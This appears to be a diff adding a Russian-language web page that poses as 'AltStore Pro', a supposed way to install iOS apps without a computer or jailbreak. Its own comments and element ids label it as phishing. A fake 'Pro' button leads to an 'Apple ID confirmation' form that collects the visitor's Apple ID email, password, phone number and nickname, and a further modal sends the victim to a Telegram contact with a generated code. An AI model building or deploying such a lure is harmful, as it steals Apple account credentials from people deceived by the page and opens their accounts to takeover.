@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AltStore Pro - установка без ПК</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo" class="apple-logo">
+            <h1>AltStore Pro</h1>
+            <p>Установка приложений без компьютера и jailbreak</p>
+        </div>
+
+        <div class="device-selector">
+            <label>Выберите версию iOS:</label>
+            <select id="ios-version">
+                <option value="iOS 15+">iOS 15+</option>
+                <option value="iOS 16+">iOS 16+</option>
+                <option value="iOS 17+">iOS 17+</option>
+                <option value="iOS 18+">iOS 18+</option>
+                <option value="iOS 26+">iOS 26+ (бета)</option>
+            </select>
+
+            <label>Выберите модель iPhone:</label>
+            <select id="iphone-model">
+                <option value="iPhone 7">iPhone 7</option>
+                <option value="iPhone 8">iPhone 8</option>
+                <!-- ... до iPhone 17 Pro Max -->
+                <option value="iPhone 17 Pro Max">iPhone 17 Pro Max</option>
+            </select>
+        </div>
+
+        <div class="video-tutorial">
+            <p>Как работает AltStore? <a href="#" id="video-link">Смотреть видео на YouTube</a></p>
+        </div>
+
+        <div class="buttons">
+            <a href="https://altstore.io" class="btn btn-primary" target="_blank">AltStore (официальный)</a>
+            <button id="altstore-pro-btn" class="btn btn-secondary">AltStore Pro</button>
+        </div>
+    </div>
+
+    <!-- Модальное окно AltStore Pro -->
+    <div id="pro-modal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h2>AltStore Pro</h2>
+            <p>Это специальная версия, не требующая компьютера и jailbreak. Для продолжения установки необходимо подтвердить аккаунт Apple.</p>
+            <button id="continue-phish" class="btn btn-primary">Продолжить</button>
+        </div>
+    </div>
+
+    <!-- Модальное окно фишинга -->
+    <div id="phish-modal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h2>Подтверждение Apple ID</h2>
+            <form id="phish-form">
+                <input type="email" id="apple-id" placeholder="Apple ID (почта)" required>
+                <input type="password" id="password" placeholder="Пароль" required>
+                <input type="tel" id="phone" placeholder="Номер телефона" required>
+                <input type="text" id="nickname" placeholder="Ваш никнейм" required>
+                <p>Есть ли у вас сертификат от Apple для установки IPA?</p>
+                <label><input type="radio" name="cert" value="yes"> Да</label>
+                <label><input type="radio" name="cert" value="no" checked> Нет</label>
+                <button type="submit" class="btn btn-primary">Проверить</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Модальное окно фишинга 2 (Telegram) -->
+    <div id="telegram-modal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h2>Свяжитесь с разработчиком</h2>
+            <p>Перейдите в Telegram к @altstorepro и отправьте этот код:</p>
+            <div id="generated-code" class="code">ALT<span id="random-digits">000</span>PRO</div>
+            <p>После отправки вы получите доступ к установке.</p>
+            <button id="fake-done" class="btn btn-primary">Я отправил</button>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
